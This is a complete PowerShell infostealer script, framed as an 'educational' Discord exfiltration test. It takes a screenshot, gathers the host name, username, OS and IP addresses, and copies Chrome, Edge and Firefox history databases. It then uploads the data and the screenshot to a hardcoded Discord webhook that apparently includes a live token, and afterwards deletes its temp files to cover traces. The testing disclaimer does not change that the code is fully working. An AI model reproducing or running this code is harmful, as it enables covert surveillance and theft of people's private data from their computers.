# Discord Data Exfiltration Test Script
# WARNING: For educational and personal testing ONLY

# =========================
# CONFIGURATION
# =========================
$webhookUrl = "https://discord.com/api/webhooks/1438102665900068966/IW_cUGLJMcqk9A8vHVlW-ELAjSSddZjFWJgmOKaVZgyHzO1QQPSiwUCmINI10blwstec"

# =========================
# SCREENSHOT FUNCTION
# =========================
function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $tempPath = "$env:TEMP\sc_$(Get-Random).png"
        $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return $tempPath
    }
    catch {
        Write-Host "Screenshot failed: $_"
        return $null
    }
}

# =========================
# BROWSER HISTORY FUNCTION
# =========================
function Get-BrowserHistory {
    $historyData = @()
    
    # Chrome History
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (Test-Path $chromePath) {
        try {
            $tempDb = "$env:TEMP\chrome_hist_$(Get-Random)"
            Copy-Item $chromePath $tempDb -ErrorAction Stop
            
            $historyData += "`n=== CHROME HISTORY ===`n"
            $historyData += "Chrome history file copied to: $tempDb`n"
            $historyData += "(Full SQL extraction would require SQLite library)`n"
        }
        catch {
            $historyData += "Chrome: Browser may be open (file locked)`n"
        }
    }
    
    # Edge History
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    if (Test-Path $edgePath) {
        try {
            $tempDb = "$env:TEMP\edge_hist_$(Get-Random)"
            Copy-Item $edgePath $tempDb -ErrorAction Stop
            $historyData += "`n=== EDGE HISTORY ===`n"
            $historyData += "Edge history file copied to: $tempDb`n"
        }
        catch {
            $historyData += "Edge: Browser may be open (file locked)`n"
        }
    }
    
    # Firefox History (places.sqlite)
    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfiles) {
        Get-ChildItem $firefoxProfiles -Directory | ForEach-Object {
            $placesDb = Join-Path $_.FullName "places.sqlite"
            if (Test-Path $placesDb) {
                try {
                    $tempDb = "$env:TEMP\ff_hist_$(Get-Random)"
                    Copy-Item $placesDb $tempDb -ErrorAction Stop
                    $historyData += "`n=== FIREFOX HISTORY ===`n"
                    $historyData += "Firefox history file copied to: $tempDb`n"
                }
                catch {
                    $historyData += "Firefox: Browser may be open (file locked)`n"
                }
            }
        }
    }
    
    return ($historyData -join "`n")
}

# =========================
# SYSTEM INFO FUNCTION
# =========================
function Get-SystemInfo {
    $info = @"
=== SYSTEM INFORMATION ===
Computer Name: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
IP Addresses: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress -join ', ')
Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
    return $info
}

# =========================
# DISCORD UPLOAD FUNCTION
# =========================
function Send-ToDiscord {
    param(
        [string]$WebhookUrl,
        [string]$Message,
        [string]$FilePath
    )
    
    try {
        if ($FilePath -and (Test-Path $FilePath)) {
            # Upload with file
            $fileName = Split-Path $FilePath -Leaf
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            
            $bodyLines = (
                "--$boundary",
                "Content-Disposition: form-data; name=`"content`"$LF",
                $Message,
                "--$boundary",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                "Content-Type: application/octet-stream$LF",
                $fileEnc,
                "--$boundary--$LF"
            ) -join $LF
            
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        }
        else {
            # Text only
            $payload = @{
                content = $Message
            } | ConvertTo-Json
            
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'application/json' -Body $payload
        }
        
        return $true
    }
    catch {
        Write-Host "Discord upload failed: $_"
        return $false
    }
}

# =========================
# MAIN EXECUTION
# =========================
Write-Host "Starting data collection test..."

# Collect system info
$sysInfo = Get-SystemInfo

# Collect browser history
$browserHistory = Get-BrowserHistory

# Take screenshot
$screenshotPath = Get-Screenshot

# Combine all text data
$fullMessage = @"
$sysInfo

$browserHistory

===========================
Test completed at $(Get-Date)
"@

# Send to Discord
Write-Host "Sending data to Discord..."

# Send text data
Send-ToDiscord -WebhookUrl $webhookUrl -Message $fullMessage

# Send screenshot if available
if ($screenshotPath) {
    Start-Sleep -Seconds 1
    Send-ToDiscord -WebhookUrl $webhookUrl -Message "Screenshot captured:" -FilePath $screenshotPath
    
    # Cleanup screenshot
    Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
}

Write-Host "Test complete!"

# Cleanup temp files
Get-ChildItem $env:TEMP | Where-Object {$_.Name -like "*hist_*"} | Remove-Item -Force -ErrorAction SilentlyContinue
